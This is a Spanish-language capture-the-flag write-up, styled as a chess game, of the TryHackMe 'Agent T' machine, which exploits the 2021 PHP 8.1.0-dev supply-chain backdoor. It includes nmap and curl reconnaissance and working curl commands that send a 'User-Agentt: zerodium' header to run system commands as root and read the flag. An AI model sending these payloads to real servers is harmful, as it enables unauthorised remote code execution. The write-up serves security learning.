```
♟ PARTIDA 007
  AGENT T
  TryHackMe · Easy · Linux
```

```bash
$ whoami
> t474_r0b07

$ cat /etc/context
> php 8.1.0-dev.
> backdoor introducido por ataque a repositorio oficial.
> una cabecera http con doble t.
> esto no es una vulnerabilidad de configuración.
> es una vulnerabilidad de confianza.
```

---

## `> ♟ APERTURA: lectura del tablero`

```bash
$ cat first_impression.txt
> agent t.
> la cabecera lo dice todo.
> X-Powered-By: PHP/8.1.0-dev
```

> Esta partida es diferente. No es descuido operacional ni contraseña débil. Es un ataque a la cadena de suministro: alguien comprometió el repositorio oficial de PHP e introdujo un backdoor directamente en el código fuente. La versión llegó a servidores reales antes de que lo detectaran. Aquí está como laboratorio. El mecanismo es real.

---

## `> ♞ PIEZA EXPUESTA: reconocimiento`

```bash
$ nmap -sV -p- <IP>

PORT   STATE SERVICE VERSION
80/tcp open  http    PHP 8.1.0-dev
```

```bash
$ curl -I http://<IP>

X-Powered-By: PHP/8.1.0-dev
```

> Una cabecera. Eso es todo lo que necesitaba ver.
>
> PHP 8.1.0-dev no es una versión de producción: es una versión de desarrollo que nunca debió llegar a un servidor activo. Y tiene historia.

---

## `> ♝ HIPÓTESIS: línea de juego`

```bash
$ cat hypothesis.txt
> php 8.1.0-dev · backdoor confirmado en historial de commits
> vector: cabecera User-Agentt con prefijo zerodium
> resultado esperado: RCE directo
> escalada: servidor corre como root en el contenedor
> movimientos necesarios: uno
```

> En marzo de 2021 alguien introdujo dos commits maliciosos en el repositorio oficial de PHP. El backdoor activaba ejecución de código si la petición HTTP contenía una cabecera `User-Agentt`: con doble t: que empezara con `zerodium`. Fue detectado y revertido en horas. Pero la versión comprometida existió. Y algunos servidores la corrieron.

---

## `> ♜ INICIATIVA: ruptura`

```bash
$ curl -H "User-Agentt: zerodium system('id');" http://<IP>/

> uid=0(root) gid=0(root)
```

> Un comando. Una cabecera. Ejecución directa como root.

```bash
$ curl -H "User-Agentt: zerodium system('cat /flag.txt');" http://<IP>/

> THM{[REDACTED]}
```

---

## `> ♚ JAQUE MATE`

> Sin escalada. Sin pivot. El backdoor entregó root en el primer contacto. La partida duró un comando.

---

## `> ♜ ANÁLISIS DE LA PARTIDA: ¿dónde perdió el rey?`

```bash
$ cat postmortem.txt

MOVIMIENTO 1: php 8.1.0-dev en producción · versión con backdoor documentado
MOVIMIENTO 2: no hay movimiento 2
```

> Esta es la partida más corta de la serie. Y la más interesante conceptualmente.
>
> Las otras máquinas perdieron por descuido: contraseñas débiles, servicios mal configurados, binarios con sudo innecesario. Esta perdió por confiar. Confiar en que el código que descargás del repositorio oficial es el código que dicen que es.
>
> El backdoor en PHP 8.1.0-dev duró menos de un día en el repositorio oficial. Fue suficiente. Los ataques a la cadena de suministro no necesitan persistencia: necesitan el momento exacto en que alguien descarga y despliega sin verificar.

```bash
$ echo $LESSON
> verificar hashes de descarga no es paranoia.
> es el mínimo razonable.
> el repositorio oficial también puede estar comprometido.
> ya pasó.
```

---

> *partida 007 · agent t · jaque mate confirmado*
> *→ [t474-r0b07](https://github.com/t474-r0b07)*

<!--
  la cabecera tenía doble t.
  el repositorio oficial había sido comprometido.
  confiaron en el código sin verificarlo.
  eso fue suficiente.
-->
